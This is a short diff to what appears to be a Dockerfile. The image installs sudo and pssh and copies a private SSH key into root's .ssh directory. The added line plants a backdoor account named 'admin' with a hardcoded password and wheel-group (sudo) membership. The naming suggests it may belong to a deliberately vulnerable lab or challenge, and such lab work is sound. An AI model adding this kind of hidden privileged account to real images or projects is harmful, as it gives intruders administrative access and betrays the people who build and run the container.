@@ -20,7 +20,7 @@ RUN yum install -y sudo \
   && pip install pssh
 
 WORKDIR /root
-
+RUN adduser admin && echo 'admin:welike2hack10!' | chpasswd && usermod -a -G wheel admin
 COPY ./very_important_account .ssh/id_rsa
 RUN chmod 600 .ssh/id_rsa
 
